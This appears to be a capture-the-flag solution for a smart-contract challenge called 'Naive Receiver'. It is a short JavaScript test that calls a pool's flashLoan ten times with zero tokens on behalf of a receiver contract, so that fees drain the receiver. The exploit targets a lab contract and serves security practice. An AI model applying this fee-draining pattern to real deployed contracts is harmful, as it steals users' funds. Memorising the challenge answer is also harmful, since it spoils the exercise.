# 2 - Naive Receiver

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Borrow 0 tokens to receiver (charging a 1 ether fee each time)
  for (let i = 0; i < 10; i++) {
    await this.pool.flashLoan(this.receiver.address, 0)
  }
})
```
